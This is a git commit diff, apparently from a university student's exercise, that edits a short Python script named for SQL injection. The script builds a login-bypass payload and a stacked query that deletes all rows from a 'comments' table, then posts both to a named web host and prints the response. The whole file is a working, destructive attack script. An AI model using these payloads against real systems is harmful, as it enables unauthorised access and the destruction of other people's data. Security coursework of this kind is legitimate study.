aa716f1041368ddd183a3f0f901740bb125af97a
xsucho08 <xsucho08@vutbr.cz>
2020-11-03 17:44:11 +0100

    SQL third attempt

--- SQL Injection/sqlInjexction.py
+++ SQL Injection/sqlInjexction.py
@@ -1,15 +1,15 @@
-import mysql.connector
 import requests
 
+
 usernameField = 'anything\' OR \'x\'=\'x'
-passwordField = 'anything\' OR \'x\'=\'x\'; DELETE TOP 1 FROM comments ; --'
+passwordField = 'anything\' OR \'x\'=\'x\'; DELETE FROM comments; --\';'
 
 print(usernameField)
 print(passwordField)
 
 url = 'http://apache1.willilazarov.cz/'
-values = {'username': usernameField ,
-          'password': passwordField }
+values = {'username': usernameField,
+          'password': passwordField}
 
 r = requests.post(url, data=values)
 print(r.content)
